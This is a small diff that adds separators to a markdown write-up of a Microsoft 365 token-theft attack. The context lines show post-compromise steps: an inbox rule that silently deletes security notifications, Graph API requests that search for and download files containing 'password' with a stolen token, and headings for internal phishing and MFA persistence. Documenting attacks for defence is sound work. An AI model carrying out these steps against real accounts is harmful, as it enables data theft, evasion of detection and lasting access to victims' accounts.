@@ -137,6 +137,7 @@ The attack took **2 minutes and 28 seconds** from code generation to token recei
 
 At this point — no alerts fired. No CA policies triggered. No Sentinel rules matched. The sign-in logs showed a normal successful authentication. The attack was completely silent.
 
+---
 
 ### Post-Compromise Actions
 
@@ -152,6 +153,8 @@ New-InboxRule -Name "System Update" `
 
 Any Microsoft security notification sent to the victim is now silently deleted before they can read it.
 
+---
+
 **Sensitive file download — data exfiltration**
 
 ```bash
@@ -160,7 +163,7 @@ GET https://graph.microsoft.com/v1.0/me/drive/root/search(q='password')
 GET https://graph.microsoft.com/v1.0/me/drive/items/{id}/content
 Authorization: Bearer [STOLEN_TOKEN]
 ```
-
+---
 **Internal phishing — lateral movement**
 
 ```bash
@@ -176,6 +179,8 @@ Authorization: Bearer [STOLEN_TOKEN]
 ```
 
 Sent from a legitimate internal account. No suspicious sender. No phishing indicators.
+
+---
 
 **MFA method registration — persistence**
 
